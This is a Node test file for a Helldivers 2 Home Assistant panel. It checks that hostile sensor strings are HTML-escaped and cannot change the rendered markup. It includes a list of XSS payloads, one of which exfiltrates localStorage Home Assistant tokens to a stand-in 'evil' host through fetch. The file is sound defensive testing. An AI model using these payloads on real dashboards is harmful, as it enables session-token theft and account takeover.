// Run: node tests/panel.test.mjs   (no dependencies)
// Renders the panel with benign and hostile sensor data and checks that hostile
// strings cannot add or change a single tag: the tag lists must be identical.
import { readFileSync } from "node:fs";
import vm from "node:vm";
import assert from "node:assert/strict";

const src = readFileSync(new URL("../custom_components/helldivers2/frontend/helldivers2-panel.js", import.meta.url), "utf8");
let PanelClass;
const ctx = {
  HTMLElement: class { attachShadow() { this.shadowRoot = { innerHTML: "" }; return this.shadowRoot; } },
  customElements: { define: (_name, cls) => { PanelClass = cls; } },
};
vm.runInNewContext(src, ctx);

const PAYLOADS = [
  "<img src=x onerror=alert(document.cookie)",            // unclosed tag from the finding
  '<img src=x onerror="fetch(`//evil/`+localStorage.hassTokens)">',
  "</div><script>alert(1)</script>",
  '" onmouseover="alert(1)',
  "' onfocus='alert(1)",
];

function hass(text, n = 1) {
  const st = (state, attributes = {}) => ({ state, attributes });
  const s = {};
  const set = (k, state, attributes) => { s[`sensor.helldivers_2_${k}`] = st(state, attributes); };
  for (const k of ["total_players", "terminid_players", "automaton_players", "illuminate_players",
                   "missions_won", "missions_lost", "terminid_kills", "automaton_kills",
                   "illuminate_kills", "total_deaths", "friendly_kills"]) set(k, text);
  set("major_order", text);
  set("major_order_progress", "1 / 2");
  set("major_order_expiration", text);
  set("major_order_reward", text);
  set("mission_success_rate", text);
  set("hottest_planet", text, { players: 5, liberation: text, sector: text, biome: text, hazards: text });
  set("active_planets", text, { active_campaigns: Array.from({ length: n }, () => ({ name: text, players: text, liberation: text })) });
  set("latest_news", text, { recent_news: [{ message: text }, { message: text }] });
  set("latest_patch", text);
  set("game_version", text);
  set("average_liberation", text);
  return { states: s };
}

function render(h) {
  const p = new PanelClass();
  p.hass = h;
  return p.shadowRoot.innerHTML;
}
const tags = html => html.match(/<[^>]*>/g);

const baseline = tags(render(hass("Benign Text")));
for (const payload of PAYLOADS) {
  const html = render(hass(payload));
  assert.deepEqual(tags(html), baseline, `payload changed markup: ${payload}`);
  assert.ok(!/<(img|script)/i.test(html), `raw tag leaked: ${payload}`);
  assert.ok(html.includes("&lt;") || html.includes("&quot;") || html.includes("&#39;"), `payload not escaped: ${payload}`);
}

// Normal upstream content (already stripped server-side) renders as plain text, no entities.
const normal = render(hass("Defend GATRIA and WASAT, utilizing the Maelstrom Tank."));
assert.ok(normal.includes(">Defend GATRIA and WASAT, utilizing the Maelstrom Tank.<"));
assert.ok(!/&(amp|lt|gt|quot|#39);/.test(normal), "benign text was over-escaped");

console.log(`panel escape test: ${PAYLOADS.length} payloads inert, benign text unchanged — OK`);
